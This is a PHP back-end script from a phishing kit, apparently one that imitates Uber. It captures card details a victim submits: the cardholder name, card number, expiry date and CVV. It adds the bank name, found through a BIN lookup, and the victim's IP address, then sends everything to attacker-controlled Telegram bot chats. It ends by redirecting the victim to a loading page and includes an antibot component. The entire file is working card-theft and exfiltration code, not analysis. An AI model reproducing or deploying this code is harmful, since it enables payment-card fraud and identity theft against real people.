<?php
session_start();
require "antibot.php";
include "id.php";

$ip = getenv("REMOTE_ADDR");

// Retrieve personal info from session
$first = isset($_SESSION['first']) ? $_SESSION['first'] : '';
$second = isset($_SESSION['second']) ? $_SESSION['second'] : '';
$num = isset($_SESSION['num']) ? $_SESSION['num'] : '';

$bin        = str_replace(' ', '', $_POST['cardNumber']);
$bin        = substr($bin, 0, 6);
$getdetails = 'https://lookup.binlist.net/' . $bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['_namebank_'] = $namebank   = $details->bank->name;
$_SESSION['_brand_'] = $brand   = $details->brand;

// Combined message
$message = "😈 🕶️ =|=[zokok LOG ]=| 🕶️ 😈
═════════════════════════════
💳 ta9aesm   : ".$_POST['cardholder_name']."
💳 numro   : ".$_POST['card_number']."
📆 expss   : ".$_POST['expiry_date']."
🔐 cvbien  : ".$_POST['cvv']."
🏦  𝗡𝗮𝗺𝗲     : ".$namebank."
💠  𝗧𝘆𝗽𝗲     : ".$brand."
🌍 𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀     : ".$ip."
═════════════════════════════
🩸 𝖀𝖇𝖊𝖗 𝕭𝖑𝖆𝖈𝖐 𝕷𝖔𝖌 • V1 😈
═════════════════════════════\n";

foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot' . $bot . '/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}


// Clear the session data if you don't need it anymore
session_destroy();

HEADER("Location: loading.php");
?>